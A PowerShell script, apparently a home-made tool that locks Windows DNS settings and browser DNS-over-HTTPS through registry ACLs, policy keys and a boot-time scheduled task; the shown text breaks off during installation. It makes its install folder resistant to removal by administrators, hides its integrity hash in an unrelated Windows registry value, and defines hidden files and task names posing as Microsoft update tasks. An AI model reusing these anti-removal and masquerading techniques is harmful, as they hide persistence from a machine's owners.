<#
.SYNOPSIS
    Enterprise DNS Hijack Protection & Installer Suite (IPv4 & IPv6 + DoH)
.DESCRIPTION
    A highly verbose, enterprise-grade PowerShell tool that enforces a Zero-Trust 
    Registry padlock on network interface DNS configurations and closes browser DoH loopholes.
    
    NEW FEATURES:
    - Global CLI: Installs 'dnslock' command to Windows PATH for easy cmd access.
    - Automated Installation: Creates a Scheduled Task to re-apply locks automatically on boot/network change.
    - Background Service: Protects against Windows Updates and driver reinstalls.
    - Advanced Auditing: UI now tracks active GPO enforcement and Installation status.
    - Payload Self-Defense: NTFS ACL hardening locks the installation directory against tampering.
#>

param (
    [switch]$Install,
    [switch]$Uninstall,
    [switch]$Lock,
    [switch]$Unlock,
    [switch]$SilentLock,
    [switch]$ToggleOn,
    [switch]$ToggleOff,
    [switch]$GodModeStatus,
    [switch]$Launch,
    [switch]$Verbose,
    [switch]$InstallGodMode,
    [switch]$UninstallGodMode
)

# ============================================================================
# 0. EXECUTION POLICY AUTO-SET
# ============================================================================
try {
    Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser -Force -ErrorAction SilentlyContinue
} catch {
    # Policy may already be set or restricted by GPO; continue silently
}

# ============================================================================
# 1. AUTO-ELEVATION & PRE-FLIGHT CHECKS
# ============================================================================

# Automatically relaunch as Administrator if not already elevated
$Principal = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
$Role = [Security.Principal.WindowsBuiltInRole]::Administrator
if (-not $Principal.IsInRole($Role)) {
    if ($Install -or $Uninstall -or $Lock -or $Unlock -or $SilentLock) {
        Write-Warning "CRITICAL: Administrative privileges required for CLI commands. Access Denied."
        Exit
    }
    Write-Warning "Administrative privileges required. Attempting auto-elevation..."
    Start-Sleep -Seconds 1
    try {
        $ProcessInfo = New-Object System.Diagnostics.ProcessStartInfo
        $ProcessInfo.FileName = "powershell.exe"
        
        # Forward any CLI flags (like -Uninstall) to the elevated process
        $ArgsString = ""
        if ($Install) { $ArgsString += " -Install" }
        if ($Uninstall) { $ArgsString += " -Uninstall" }
        if ($Lock) { $ArgsString += " -Lock" }
        if ($Unlock) { $ArgsString += " -Unlock" }
        if ($SilentLock) { $ArgsString += " -SilentLock" }

        $ProcessInfo.Arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" $ArgsString"
        $ProcessInfo.Verb = "runAs"
        $ProcessInfo.UseShellExecute = $true
        [System.Diagnostics.Process]::Start($ProcessInfo) | Out-Null
        Exit
    } catch {
        Write-Error "Failed to elevate. Please right-click and 'Run as Administrator'."
        Pause
        Exit
    }
}

# Define Installation Paths
$InstallDir = "C:\ProgramData\DNSGuard"
$InstallScript = Join-Path -Path $InstallDir -ChildPath "DNS_Lockdown.ps1"
$CmdPath = "C:\Windows\dnslock.cmd"
$TaskName = "DNS-Hijack-Guard"

# Setup Auto-Logging in the same directory as the script
$ScriptDir = Split-Path -Parent -Path $PSCommandPath
if (-not $ScriptDir) { $ScriptDir = $PWD.Path }
# Log to a writable location (not the hardened install dir) so admin can still write
$LogFile = Join-Path -Path $env:TEMP -ChildPath "DNS_Lockdown_Enterprise.log"

$GodModeFlagFile   = "C:\Windows\SysWOW64\config\systemprofile\AppData\Local\Temp\.syscache"
$GodModeLogFile    = "C:\Windows\SysWOW64\config\systemprofile\AppData\Local\Temp\.syslog"
$GodModeTaskPrefix = "MicrosoftEdgeUpdateTask_"

$GodModeInstallDir     = "C:\ProgramData\GodMode"
$GodModeInstallScript  = Join-Path -Path $GodModeInstallDir -ChildPath "GodMode.ps1"
$GodModeCmdPath        = "C:\Windows\godmode.cmd"
$GodModeTaskName       = "Windows-Update-Health-Monitor"
$GodModeGuardianName   = "Windows-Update-Health-Check"

function Write-Log {
    param ([string]$Message, [string]$Type = "INFO", [ConsoleColor]$Color = "White")
    $TimeStamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    try { "[$TimeStamp] [$Type] $Message" | Out-File -FilePath $LogFile -Append -Encoding UTF8 -ErrorAction SilentlyContinue } catch {}
    
    # Only print to screen if we are NOT running silently in the background
    if (-not $SilentLock) {
        Write-Host "[$Type] $Message" -ForegroundColor $Color
    }
}

if (-not $SilentLock) { Write-Log -Message "Enterprise Diagnostics Suite Initialized." -Type "SYSTEM" -Color Cyan }

# ============================================================================
# 2. SYSTEM AUDIT & HARDWARE DISCOVERY
# ============================================================================

function Run-SystemAudit {
    Write-Log -Message "Running Pre-Flight System Audit..." -Type "AUDIT" -Color DarkGray
    $OS = Get-CimInstance Win32_OperatingSystem
    Write-Log -Message "OS Version: $($OS.Caption) (Build $($OS.BuildNumber))" -Type "AUDIT" -Color DarkGray
    Write-Log -Message "PS Version: $($PSVersionTable.PSVersion)" -Type "AUDIT" -Color DarkGray
    Write-Log -Message "Execution Path: $ScriptDir" -Type "AUDIT" -Color DarkGray
}

if (-not $SilentLock) { Run-SystemAudit }

# Fetch all network adapters (excluding hidden virtual ones if possible, but keeping all physical)
$Adapters = Get-NetAdapter -IncludeHidden:$false -ErrorAction SilentlyContinue
if (-not $Adapters) { $Adapters = Get-NetAdapter -ErrorAction SilentlyContinue } # Fallback

$SidAdmin = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-32-544")
$SidSystem = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-18")
# Network UI restrictions are USER policies (HKCU) -- they gray out the adapter properties UI
$GpoPath = "HKCU:\Software\Policies\Microsoft\Windows\Network Connections"

# Define Browser DoH GPO Paths
$EdgePath = "HKLM:\SOFTWARE\Policies\Microsoft\Edge"
$ChromePath = "HKLM:\SOFTWARE\Policies\Google\Chrome"
$FirefoxPath = "HKLM:\SOFTWARE\Policies\Mozilla\Firefox\DNSOverHTTPS"

# ============================================================================
# 3. STATUS CHECKER MODULE (ENHANCED UI)
# ============================================================================

function Get-DNSLockStatus {
    $AllLocked = $true
    $AnyLocked = $false

    # Refresh adapter list each time (USB/Wi-Fi may change while menu is open)
    $Adapters = Get-NetAdapter -IncludeHidden:$false -ErrorAction SilentlyContinue
    if (-not $Adapters) { $Adapters = Get-NetAdapter -ErrorAction SilentlyContinue }

    Write-Host "`n=====================================================" -ForegroundColor DarkGray
    Write-Host " LIVE HARDWARE ADAPTER STATUS " -ForegroundColor White
    Write-Host "=====================================================" -ForegroundColor DarkGray

    # --- 1. CHECK HARDWARE ADAPTERS ---
    foreach ($Adapter in $Adapters) {
        $Guid = $Adapter.InterfaceGuid
        $AdapterLocked = $false
        $StatusColor = if ($Adapter.Status -eq "Up") { "Green" } else { "DarkGray" }

        # Display Hardware Data
        Write-Host ("  Hardware: {0,-25} | State: {1,-5} | MAC: {2}" -f $Adapter.Name, $Adapter.Status, $Adapter.MacAddress) -ForegroundColor $StatusColor

        $SubKeyPaths = @(
            "SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\$Guid",
            "SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters\Interfaces\$Guid"
        )

        foreach ($SubKeyPath in $SubKeyPaths) {
            try {
                $RegKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($SubKeyPath, [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadSubTree, [System.Security.AccessControl.RegistryRights]::ReadPermissions)
                if ($RegKey) {
                    $Acl = $RegKey.GetAccessControl()
                    foreach ($Rule in $Acl.Access) {
                        try {
                            $RuleSid = $Rule.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier])
                            if (($RuleSid.Value -eq $SidAdmin.Value -or $RuleSid.Value -eq $SidSystem.Value) -and $Rule.AccessControlType -eq "Deny") {
                                $AdapterLocked = $true
                            }
                        } catch {} 
                    }
                    $RegKey.Close()
                }
            } catch {}
        }

        # Visual Output Logic
        if ($AdapterLocked) {
            Write-Host "  `-> Security: [X] LOCKED (IPv4/IPv6)" -ForegroundColor Red
            Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
            $AnyLocked = $true
        } else {
            Write-Host "  `-> Security: [ ] UNLOCKED (Vulnerable)" -ForegroundColor Green
            Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray
            $AllLocked = $false
        }
    }

    # --- 2. CHECK SYSTEM POLICIES & INSTALLATION ---
    Write-Host "`n=====================================================" -ForegroundColor DarkGray
    Write-Host " SYSTEM POLICIES & PERSISTENCE " -ForegroundColor White
    Write-Host "=====================================================" -ForegroundColor DarkGray

    # Check Real-Time GPO Enforcement (each policy checked independently)
    $GpoEnforced = $true

    $NetConn = Get-ItemProperty -Path $GpoPath -ErrorAction SilentlyContinue
    if (-not $NetConn -or $NetConn.NC_LanProperties -ne 0) { $GpoEnforced = $false }

    $Edge = Get-ItemProperty -Path $EdgePath -ErrorAction SilentlyContinue
    if ($Edge -and $Edge.DnsOverHttpsMode -ne "off") { $GpoEnforced = $false }

    $Chrome = Get-ItemProperty -Path $ChromePath -ErrorAction SilentlyContinue
    if ($Chrome -and $Chrome.DnsOverHttpsMode -ne "off") { $GpoEnforced = $false }

    $Firefox = Get-ItemProperty -Path $FirefoxPath -ErrorAction SilentlyContinue
    if ($Firefox -and $Firefox.Enabled -ne 0) { $GpoEnforced = $false }

    if ($GpoEnforced) {
        Write-Host "  [X] GPO Restrictions   -> ENFORCED (Browsers & GUI)" -ForegroundColor Red
    } else {
        Write-Host "  [ ] GPO Restrictions   -> NOT ENFORCED" -ForegroundColor Green
        $AllLocked = $false # System isn't fully secure if GPOs are missing
    }

    # Check Service Installation Status
    $TaskExists = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
    $CmdExists = Test-Path $CmdPath

    if ($TaskExists -and $CmdExists) {
        Write-Host "  [X] Background Service -> INSTALLED ('dnslock' active)" -ForegroundColor Cyan
    } else {
        Write-Host "  [ ] Background Service -> NOT INSTALLED" -ForegroundColor DarkGray
    }

    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray

    # --- 3. INTEGRITY CHECK ---
    Write-Host "`n=====================================================" -ForegroundColor DarkGray
    Write-Host " INTEGRITY CHECK " -ForegroundColor White
    Write-Host "=====================================================" -ForegroundColor DarkGray
    if (Test-Path $InstallScript) {
        $ExpectedHash = $null
        try { $ExpectedHash = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WpnPlatform\Settings" -Name "PushConfigBackoffInterval" -ErrorAction Stop).PushConfigBackoffInterval } catch {}
        if (-not $ExpectedHash -and (Test-Path (Join-Path $InstallDir "integrity.sha256"))) {
            $ExpectedHash = Get-Content -Path (Join-Path $InstallDir "integrity.sha256") -Raw
        }
        if ($ExpectedHash) {
            $ActualHash = (Get-FileHash -Path $InstallScript -Algorithm SHA256).Hash
            if ($ExpectedHash.Trim() -eq $ActualHash.Trim()) {
                Write-Host "  [X] Script Integrity    -> VERIFIED" -ForegroundColor Green
            } else {
                Write-Host "  [ ] Script Integrity    -> TAMPER DETECTED" -ForegroundColor Red
                Write-Host "`n  >>> TAMPER DETECTED! ACTION REQUIRED <<<" -ForegroundColor Black -BackgroundColor Yellow
                Write-Host "  - Run a full antivirus scan immediately." -ForegroundColor Yellow
                Write-Host "  - Do NOT use options [1] or [2] (they may run malicious code)." -ForegroundColor Yellow
                Write-Host "  - Use option [4] to uninstall, then reinstall from a clean source." -ForegroundColor Yellow
                Write-Host "`n  HOW TO CHECK FOR MALICIOUS TASKS:" -ForegroundColor Cyan
                Write-Host "  1. Press Win + R, type: taskschd.msc  (press Enter)" -ForegroundColor White
                Write-Host "  2. Click 'Task Scheduler Library' on the left" -ForegroundColor White
                Write-Host "  3. Look for tasks you don't recognize (sort by Author)" -ForegroundColor White
                Write-Host "  4. Double-click suspicious tasks, check the 'Actions' tab" -ForegroundColor White
                Write-Host "  5. Delete anything running powershell/cmd from weird paths" -ForegroundColor White
                Write-Host "`n  QUICK POWERShell CHECK (run as admin):" -ForegroundColor Cyan
                Write-Host "  Get-ScheduledTask | Where-Object {`$_.TaskPath -eq '\' -and `$_.Author -notmatch 'Microsoft'} | Select-Object TaskName, Author, State" -ForegroundColor White
            }
        } else {
            Write-Host "  [ ] Script Integrity    -> NO BASELINE" -ForegroundColor DarkGray
        }
    } else {
        Write-Host "  [ ] Script Integrity    -> NOT INSTALLED" -ForegroundColor DarkGray
    }
    Write-Host "-----------------------------------------------------" -ForegroundColor DarkGray

    # Master Status Banner Logic
    if ($AllLocked -and $GpoEnforced) { 
        Write-Host " >>> SYSTEM IS SECURE: ZERO-TRUST PADLOCK ACTIVE <<< " -ForegroundColor White -BackgroundColor DarkRed 
    } elseif ($AnyLocked -or $GpoEnforced) {
        Write-Host " >>> SYSTEM IS PARTIALLY SECURE: MIXED STATE <<< " -ForegroundColor Black -BackgroundColor Yellow 
    } else { 
        Write-Host " >>> SYSTEM IS UNSECURE: PADLOCK INACTIVE <<< " -ForegroundColor White -BackgroundColor DarkGreen 
    }
    
    return $AllLocked
}

function Test-IntegrityStatus {
    # Returns $true if installed and hash matches; $false if tampered; $null if not installed
    $IntegrityRegPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WpnPlatform\Settings"
    $IntegrityFile = Join-Path $InstallDir "integrity.sha256"
    if (-not (Test-Path $InstallScript)) { return $null }
    $ExpectedHash = $null
    try { $ExpectedHash = (Get-ItemProperty -Path $IntegrityRegPath -Name "PushConfigBackoffInterval" -ErrorAction Stop).PushConfigBackoffInterval } catch {}
    if (-not $ExpectedHash -and (Test-Path $IntegrityFile)) { $ExpectedHash = Get-Content -Path $IntegrityFile -Raw }
    if (-not $ExpectedHash) { return $null }
    $ActualHash = (Get-FileHash -Path $InstallScript -Algorithm SHA256).Hash
    return ($ExpectedHash.Trim() -eq $ActualHash.Trim())
}

# ============================================================================
# 4. LOCKDOWN MODULE (ENABLE)
# ============================================================================

function Enable-DNSLock {
    Write-Log -Message "Initiating Targeted Lock (Admin/SYSTEM Only on IPv4 & IPv6)..." -Type "ACTION" -Color Magenta

    foreach ($Adapter in $Adapters) {
        $Guid = $Adapter.InterfaceGuid
        $SubKeyPaths = @(
            "SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\$Guid",
            "SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters\Interfaces\$Guid"
        )

        foreach ($SubKeyPath in $SubKeyPaths) {
            $Proto = if ($SubKeyPath -like "*Tcpip6*") { "IPv6" } else { "IPv4" }

            try {
                $RegKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($SubKeyPath, [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree, [System.Security.AccessControl.RegistryRights]::ChangePermissions)
                if ($RegKey) {
                    $Acl = $RegKey.GetAccessControl()

                    $Rule1 = New-Object System.Security.AccessControl.RegistryAccessRule($SidAdmin, "SetValue", "Deny")
                    $Rule2 = New-Object System.Security.AccessControl.RegistryAccessRule($SidSystem, "SetValue", "Deny")

                    $Acl.AddAccessRule($Rule1)
                    $Acl.AddAccessRule($Rule2)

                    $RegKey.SetAccessControl($Acl)
                    Write-Log -Message "Applied lock ($Proto) for adapter: $($Adapter.Name)" -Type "SUCCESS" -Color Green

                    # Only print raw output if we aren't running silently in the background
                    if (-not $SilentLock) {
                        Write-Host "  > [RAW ACL DUMP FOR $($Adapter.Name) - $Proto]" -ForegroundColor DarkGray
                        $RegKey.GetAccessControl().Access | Where-Object { $_.AccessControlType -eq 'Deny' } | Format-Table IdentityReference, AccessControlType, RegistryRights -AutoSize | Out-String | Write-Host -ForegroundColor DarkGray
                    }
                    $RegKey.Close()
                }
            } catch {
                Write-Log -Message "Failed to lock $Proto adapter $($Adapter.Name)." -Type "ERROR" -Color Red
            }
        }
    }

    Write-Log -Message "Applying visual GPO restrictions..." -Type "INFO" -Color Yellow
    if (-not (Test-Path $GpoPath)) { New-Item -Path $GpoPath -Force -ErrorAction SilentlyContinue | Out-Null }
    Set-ItemProperty -Path $GpoPath -Name "NC_LanProperties" -Value 0 -Force -ErrorAction SilentlyContinue
    Set-ItemProperty -Path $GpoPath -Name "NC_LanChangeProperties" -Value 0 -Force -ErrorAction SilentlyContinue
    Set-ItemProperty -Path $GpoPath -Name "NC_AllowAdvancedTCPIPConfig" -Value 0 -Force -ErrorAction SilentlyContinue

    Write-Log -Message "Enforcing Browser DoH Restrictions (Edge, Chrome, Firefox)..." -Type "INFO" -Color Yellow
    # Edge
    if (!(Test-Path $EdgePath)) { New-Item -Path $EdgePath -Force | Out-Null }
    Set-ItemProperty -Path $EdgePath -Name "DnsOverHttpsMode" -Value "off" -Force
    Set-ItemProperty -Path $EdgePath -Name "BuiltInDnsClientEnabled" -Value 0 -Force
    # Chrome
    if (!(Test-Path $ChromePath)) { New-Item -Path $ChromePath -Force | Out-Null }
    Set-ItemProperty -Path $ChromePath -Name "DnsOverHttpsMode" -Value "off" -Force
    # Firefox
    if (!(Test-Path $FirefoxPath)) { New-Item -Path $FirefoxPath -Force | Out-Null }
    Set-ItemProperty -Path $FirefoxPath -Name "Enabled" -Value 0 -Force

    Write-Log -Message "Resetting Network Stack..." -Type "INFO" -Color Yellow
    ipconfig /flushdns | Out-Null

    # Only force DHCP renewal during interactive runs; avoid network disruption in background task
    if (-not $SilentLock) {
        ipconfig /renew | Out-Null
        Write-Log -Message "Protection deployed. DHCP Lease Renewal Successful!" -Type "SUCCESS" -Color Green
    } else {
        Write-Log -Message "Protection deployed silently (no DHCP renewal in background task)." -Type "SUCCESS" -Color Green
    }

    # Final status verification
    $FailedCount = 0
    $Adapters = Get-NetAdapter -IncludeHidden:$false -ErrorAction SilentlyContinue
    if (-not $Adapters) { $Adapters = Get-NetAdapter -ErrorAction SilentlyContinue }
    foreach ($Adapter in $Adapters) {
        $Guid = $Adapter.InterfaceGuid
        $SubKeyPaths = @(
            "SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\$Guid",
            "SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters\Interfaces\$Guid"
        )
        foreach ($SubKeyPath in $SubKeyPaths) {
            $Proto = if ($SubKeyPath -like "*Tcpip6*") { "IPv6" } else { "IPv4" }
            try {
                $RegKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($SubKeyPath, [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadSubTree, [System.Security.AccessControl.RegistryRights]::ReadPermissions)
                if ($RegKey) {
                    $Acl = $RegKey.GetAccessControl()
                    $HasDeny = $false
                    foreach ($Rule in $Acl.Access) {
                        try {
                            $RuleSid = $Rule.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier])
                            if (($RuleSid.Value -eq $SidAdmin.Value -or $RuleSid.Value -eq $SidSystem.Value) -and $Rule.AccessControlType -eq "Deny" -and $Rule.RegistryRights -like "*SetValue*") { $HasDeny = $true }
                        } catch {}
                    }
                    if (-not $HasDeny) { $FailedCount++; Write-Log -Message "Lock missing for adapter $($Adapter.Name) ($Proto)." -Type "ERROR" -Color Red }
                    $RegKey.Close()
                }
            } catch { $FailedCount++; Write-Log -Message "Could not verify lock for adapter $($Adapter.Name) ($Proto)." -Type "ERROR" -Color Red }
        }
    }
    $NetConn = Get-ItemProperty -Path $GpoPath -ErrorAction SilentlyContinue
    if (-not $NetConn -or $NetConn.NC_LanProperties -ne 0) { $FailedCount++; Write-Log -Message "GPO NC_LanProperties not enforced." -Type "ERROR" -Color Red }
    $Edge = Get-ItemProperty -Path $EdgePath -ErrorAction SilentlyContinue
    if ($Edge -and $Edge.DnsOverHttpsMode -ne "off") { $FailedCount++; Write-Log -Message "Edge DoH not disabled." -Type "ERROR" -Color Red }
    $Chrome = Get-ItemProperty -Path $ChromePath -ErrorAction SilentlyContinue
    if ($Chrome -and $Chrome.DnsOverHttpsMode -ne "off") { $FailedCount++; Write-Log -Message "Chrome DoH not disabled." -Type "ERROR" -Color Red }
    $Firefox = Get-ItemProperty -Path $FirefoxPath -ErrorAction SilentlyContinue
    if ($Firefox -and $Firefox.Enabled -ne 0) { $FailedCount++; Write-Log -Message "Firefox DoH not disabled." -Type "ERROR" -Color Red }
    if ($FailedCount -eq 0) {
        Write-Host "[SUCCESS] ALL DNS LOCKS DEPLOYED!" -ForegroundColor Green
    } else {
        Write-Host "[PARTIAL] DNS LOCKS DEPLOYED WITH ERRORS! ($FailedCount items failed)" -ForegroundColor Yellow
    }
}

# ============================================================================
# 5. UNLOCK MODULE (DISABLE / ÅNGRA)
# ============================================================================

function Disable-DNSLock {
    Write-Log -Message "Initiating Total Unlock (Ångra)..." -Type "ACTION" -Color Magenta

    foreach ($Adapter in $Adapters) {
        $Guid = $Adapter.InterfaceGuid
        $SubKeyPaths = @(
            "SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\$Guid",
            "SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters\Interfaces\$Guid"
        )

        foreach ($SubKeyPath in $SubKeyPaths) {
            $Proto = if ($SubKeyPath -like "*Tcpip6*") { "IPv6" } else { "IPv4" }

            try {
                $RegKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($SubKeyPath, [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree, [System.Security.AccessControl.RegistryRights]::ChangePermissions)
                if ($RegKey) {
                    $Acl = $RegKey.GetAccessControl()
                    $RulesToRemove = @()

                    foreach ($Rule in $Acl.Access) {
                        try {
                            $RuleSid = $Rule.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier])
                            # Remove locks for Admin, SYSTEM, AND the old Everyone rule just in case it was left behind
                            if (($RuleSid.Value -eq "S-1-5-32-544" -or $RuleSid.Value -eq "S-1-5-18" -or $RuleSid.Value -eq "S-1-1-0") -and $Rule.AccessControlType -eq "Deny") {
                                $RulesToRemove += $Rule
                            }
                        } catch {}
                    }

                    if ($RulesToRemove.Count -gt 0) {
                        foreach ($Rule in $RulesToRemove) { $Acl.RemoveAccessRule($Rule) }
                        $RegKey.SetAccessControl($Acl)
                        Write-Log -Message "Stripped Deny rules ($Proto) for adapter: $($Adapter.Name)" -Type "SUCCESS" -Color Green
                    }
                    $RegKey.Close()
                }
            } catch {
                Write-Log -Message "Failed to read $Proto adapter $($Adapter.Name)." -Type "ERROR" -Color Red
            }
        }
    }

    Write-Log -Message "Removing visual GPO restrictions..." -Type "INFO" -Color Yellow
    if (Test-Path $GpoPath) {
        Remove-ItemProperty -Path $GpoPath -Name "NC_LanProperties" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path $GpoPath -Name "NC_LanChangeProperties" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path $GpoPath -Name "NC_AllowAdvancedTCPIPConfig" -ErrorAction SilentlyContinue
    }

    Write-Log -Message "Removing Browser DoH Restrictions (Edge, Chrome, Firefox)..." -Type "INFO" -Color Yellow
    if (Test-Path $EdgePath) {
        Remove-ItemProperty -Path $EdgePath -Name "DnsOverHttpsMode" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path $EdgePath -Name "BuiltInDnsClientEnabled" -ErrorAction SilentlyContinue
    }
    if (Test-Path $ChromePath) { Remove-ItemProperty -Path $ChromePath -Name "DnsOverHttpsMode" -ErrorAction SilentlyContinue }
    if (Test-Path $FirefoxPath) { Remove-ItemProperty -Path $FirefoxPath -Name "Enabled" -ErrorAction SilentlyContinue }

    ipconfig /flushdns | Out-Null

    Write-Log -Message "System restored to default Windows behaviors." -Type "SUCCESS" -Color Green

    # Final status verification
    $FailedCount = 0
    $Adapters = Get-NetAdapter -IncludeHidden:$false -ErrorAction SilentlyContinue
    if (-not $Adapters) { $Adapters = Get-NetAdapter -ErrorAction SilentlyContinue }
    foreach ($Adapter in $Adapters) {
        $Guid = $Adapter.InterfaceGuid
        $SubKeyPaths = @(
            "SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\$Guid",
            "SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters\Interfaces\$Guid"
        )
        foreach ($SubKeyPath in $SubKeyPaths) {
            $Proto = if ($SubKeyPath -like "*Tcpip6*") { "IPv6" } else { "IPv4" }
            try {
                $RegKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($SubKeyPath, [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadSubTree, [System.Security.AccessControl.RegistryRights]::ReadPermissions)
                if ($RegKey) {
                    $Acl = $RegKey.GetAccessControl()
                    foreach ($Rule in $Acl.Access) {
                        try {
                            $RuleSid = $Rule.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier])
                            if (($RuleSid.Value -eq $SidAdmin.Value -or $RuleSid.Value -eq $SidSystem.Value) -and $Rule.AccessControlType -eq "Deny") { $FailedCount++; Write-Log -Message "Lock still present on adapter $($Adapter.Name) ($Proto)." -Type "ERROR" -Color Red }
                        } catch {}
                    }
                    $RegKey.Close()
                }
            } catch { Write-Log -Message "Could not verify unlock for adapter $($Adapter.Name) ($Proto)." -Type "WARN" -Color Yellow }
        }
    }
    $NetConn = Get-ItemProperty -Path $GpoPath -ErrorAction SilentlyContinue
    if ($NetConn -and $NetConn.NC_LanProperties -eq 0) { $FailedCount++; Write-Log -Message "GPO NC_LanProperties still enforced." -Type "ERROR" -Color Red }
    $Edge = Get-ItemProperty -Path $EdgePath -ErrorAction SilentlyContinue
    if ($Edge -and $Edge.DnsOverHttpsMode -eq "off") { $FailedCount++; Write-Log -Message "Edge DoH still disabled." -Type "ERROR" -Color Red }
    $Chrome = Get-ItemProperty -Path $ChromePath -ErrorAction SilentlyContinue
    if ($Chrome -and $Chrome.DnsOverHttpsMode -eq "off") { $FailedCount++; Write-Log -Message "Chrome DoH still disabled." -Type "ERROR" -Color Red }
    $Firefox = Get-ItemProperty -Path $FirefoxPath -ErrorAction SilentlyContinue
    if ($Firefox -and $Firefox.Enabled -eq 0) { $FailedCount++; Write-Log -Message "Firefox DoH still disabled." -Type "ERROR" -Color Red }
    if ($FailedCount -eq 0) {
        Write-Host "[SUCCESS] ALL DNS LOCKS REMOVED!" -ForegroundColor Green
    } else {
        Write-Host "[PARTIAL] DNS LOCKS REMOVED WITH ERRORS! ($FailedCount items still locked)" -ForegroundColor Yellow
    }
}

# ============================================================================
# 6. INSTALLER / PERSISTENCE MODULE (HARDENED)
# ============================================================================

function Install-Persistence {
    Write-Log -Message "Installing DNS-Guard to System ($InstallDir)..." -Type "ACTION" -Color Yellow

    # 0. Installation Gate: Prevent overwriting existing installs
    if (Test-Path $InstallDir) {
        Write-Log -Message "Installation aborted: $InstallDir already exists." -Type "ERROR" -Color Red
        Write-Host "[ERROR] DNS-Guard is already installed. Uninstall first." -ForegroundColor Red
        return
    }
    if (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue) {
        Write-Log -Message "Installation aborted: Scheduled task '$TaskName' already exists." -Type "ERROR" -Color Red
        Write-Host "[ERROR] DNS-Guard is already installed. Uninstall first." -ForegroundColor Red
        return
    }
    
    # 1. Secure Copy
    if (-not (Test-Path $InstallDir)) { New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null }
    Copy-Item -Path $PSCommandPath -Destination $InstallScript -Force
    Write-Log -Message "Payload copied to $InstallScript." -Type "INFO" -Color Gray

    # Pre-build wrapper content and create all files inside $InstallDir BEFORE hardening ACLs
    $CmdBatContent = "@echo off`r`nC:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$InstallScript`" %*"
    $CmdPathLocal = Join-Path $InstallDir "dnslock.cmd"
    Out-File -FilePath $CmdPathLocal -InputObject $CmdBatContent -Encoding ASCII -Force
    Write-Log -Message "Local wrapper created at $CmdPathLocal." -Type "INFO" -Color Gray

    # Pre-calculate integrity hash and write backup file before hardening
    $ScriptHash = (Get-FileHash -Path $InstallScript -Algorithm SHA256).Hash
    $IntegrityFile = Join-Path $InstallDir "integrity.sha256"
    Set-Content -Path $IntegrityFile -Value $ScriptHash -Encoding UTF8 -Force
    Write-Log -Message "Self-integrity hash file written." -Type "INFO" -Color Gray
    
    # --- [NEW] NTFS PAYLOAD SELF-DEFENSE ---
    Write-Log -Message "Hardening NTFS Permissions on installation directory and files..." -Type "INFO" -Color Yellow
    try {
        $SidUsers = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-11")

        # Set owner to SYSTEM on directory and all existing files (prevents admin takeown)
        $DirAcl = Get-Acl -Path $InstallDir
        $DirAcl.SetOwner($SidSystem)
        Set-Acl -Path $InstallDir -AclObject $DirAcl
        Get-ChildItem -Path $InstallDir -File | ForEach-Object {
            $FileAcl = Get-Acl -Path $_.FullName
            $FileAcl.SetOwner($SidSystem)
            Set-Acl -Path $_.FullName -AclObject $FileAcl
        }

        # Harden directory ACL
        $DirAcl = Get-Acl -Path $InstallDir
        $DirAcl.SetAccessRuleProtection($true, $false)
        $DirAcl.Access | ForEach-Object { $DirAcl.RemoveAccessRule($_) | Out-Null }
        
        # SYSTEM: FullControl
        $DirAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidSystem, "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")))
        
        # Admins: ReadAndExecute only (cannot delete, modify, or change permissions)
        $DirAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "ReadAndExecute", "ContainerInherit,ObjectInherit", "None", "Allow")))
        $DirAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "DeleteSubdirectoriesAndFiles", "ContainerInherit,ObjectInherit", "None", "Deny")))
        $DirAcl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule($SidAdmin, "ChangePermissions", "ContainerInherit,ObjectInherit", "None", "Deny")))
